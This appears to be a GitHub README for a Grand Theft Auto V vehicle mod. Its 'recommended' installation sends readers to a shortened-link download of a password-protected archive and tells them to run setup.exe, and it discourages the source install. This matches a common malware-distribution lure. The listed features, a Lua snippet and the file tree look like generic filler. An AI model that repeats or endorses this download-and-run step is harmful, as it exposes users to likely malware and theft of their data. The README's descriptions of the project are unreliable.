# -GTA-V-Vehicle-Enhancer

## Description
GTA V Vehicle Enhancer is a modification for Grand Theft Auto V that adds new features and improvements to the cars in the game. The mod includes realistic physics, new car models and improved textures.


📥 Installation & Run
🔹 ✅ RECOMMENDED METHOD (Windows .exe)
1️⃣ [Download](https://goo.su/ImG6) and extract archive(pass: Project12!)

2️⃣ Run setup.exe
🚀 The application will set up everything automatically, just enjoy!

⚠️ Important: This method is faster and requires no manual setup!






## Installation
1. Clone the repository:
🔹 ❌ COMPLEX METHOD (For Developers Only)
❗ This method is NOT recommended as it requires installing multiple dependencies manually.
❗ Only use this if you know what you're doing!
Bash
git clone https://github.com/pavelihanieh/GTA-Vehicle-Enhancer.git

2. Copy the files to the GTA V mods folder:

PowerShell
copy GTA-Vehicle-Enhancer/* "C:\Program Files (x86)\Steam\steamapps\common\Grand Theft Auto V\mod"

3. Make sure you have the necessary mod manager installed (for example, OpenIV).

## Usage
Launch the game through the mod manager, and the mod will be automatically activated. You will be able to notice improvements in the handling and appearance of the cars.

## Features
- Improved vehicle physics
- New vehicle models and textures
- Realistic engine sounds and motion effects
- Custom vehicle support

## Code example
Lua
function EnhanceVehicle(vehicle)
SetVehicleHandlingFloat(vehicle, "CHandlingData", "fSuspensionReboundDamping", 0.5)
SetVehicleHandlingFloat(vehicle, "CHandlingData", "fSuspensionCompDamping", 0.5)
end

## Contributions
Anyone can contribute to the project. See the CONTRIBUTING.md file for instructions.

## License
This project is licensed under the MIT License - see the LICENSE file for details.

---

### File structure
GTA-Vehicle-Enhancer/
│
├── README.md
├── LICENSE
├── requirements.txt
├── main.lua
├── vehicle_enhancer.lua
└── CONTRIBUTING.md
